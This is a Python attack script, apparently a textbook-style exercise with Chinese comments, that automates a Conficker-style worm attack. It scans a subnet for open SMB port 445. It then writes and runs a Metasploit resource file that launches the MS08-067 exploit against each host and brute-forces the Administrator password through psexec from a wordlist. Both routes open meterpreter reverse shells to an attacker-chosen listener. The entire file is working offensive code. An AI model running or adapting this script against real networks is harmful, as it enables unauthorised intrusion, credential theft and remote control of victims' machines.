# !/usr/bin/python
# coding=utf-8

import nmap
import os
import optparse



def findTgts(subNet):
    '''
    扫描存在445open的主机，放入数组
    :param subNet:
    :return:
    '''
    nmScan = nmap.PortScanner()
    nmScan.scan(subNet, '445')
    tgtHosts = []
    for host in nmScan.all_hosts():
        # 若目标主机存在TCP的445端口
        if nmScan[host].has_tcp(445):
            state = nmScan[host]['tcp'][445]['state']
            # 并且445端口是开启的
            if state == 'open':
                print('[+] Found Target Host: ' + host)
                tgtHosts.append(host)
    return tgtHosts


def setupHandler(configFile, lhost, lport):
    '''
    创建监听器
    :param configFile:
    :param lhost:
    :param lport:
    :return:
    '''
    configFile.write('use exploit/multi/handler\n')
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')
    configFile.write('exploit -j -z\n')

    # 设置全局变量DisablePayloadHandler，让已经新建一个监听器之后，后面的所有的主机不会重复新建监听器
    # 其中setg为设置全局参数
    configFile.write('setg DisablePayloadHandler 1\n')


def confickerExploit(configFile, tgtHost, lhost, lport):
    '''
    选择采用的exp
    :param configFile:
    :param tgtHost:
    :param lhost:
    :param lport:
    :return:
    '''
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
    configFile.write('set RHOST ' + str(tgtHost) + '\n')
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT ' + str(lport) + '\n')
    configFile.write('set LHOST ' + lhost + '\n')

    # -j参数表示攻击在后台进行，-z参数表示攻击完成后不与会话进行交互
    configFile.write('exploit -j -z\n')


def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    '''
    爆破SMB
    :param configFile:
    :param tgtHost:
    :param passwdFile:
    :param lhost:
    :param lport:
    :return:
    '''
    username = 'Administrator'
    pF = open(passwdFile, 'r')
    for password in pF.readlines():
        password = password.strip('\n').strip('\r')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser ' + str(username) + '\n')
        configFile.write('set SMBPass ' + str(password) + '\n')
        configFile.write('set RHOST ' + str(tgtHost) + '\n')
        configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT ' + str(lport) + '\n')
        configFile.write('set LHOST ' + lhost + '\n')
        configFile.write('exploit -j -z\n')


def main():
    configFile = open('meta.rc', 'w')
    parser = optparse.OptionParser(
        '[*] Usage : ./conficker.py -H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify the target host[s]')
    parser.add_option('-l', dest='lhost', type='string', help='specify the listen host')
    parser.add_option('-p', dest='lport', type='string', help='specify the listen port')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify the password file')
    (options, args) = parser.parse_args()
    if (options.tgtHost == None) | (options.lhost == None):
        print(parser.usage)
        exit(0)
    lhost = options.lhost
    lport = options.lport

    if lport == None:
        lport = '1337'

    passwdFile = options.passwdFile
    tgtHosts = findTgts(options.tgtHost)#扫描过后的数组
    setupHandler(configFile, lhost, lport) #监听器写入msf脚本文件

    for tgtHost in tgtHosts:
        confickerExploit(configFile, tgtHost, lhost, lport)#循环将针对不同主机的msf攻击脚本写入
        if passwdFile != None:
            smbBrute(configFile, tgtHost, passwdFile, lhost, lport)#如果提交了密码字典，将会爆破目标并执行反弹shell

    configFile.close()
    os.system('msfconsole -r meta.rc')#执行生成的msf脚本


if __name__ == '__main__':
    main()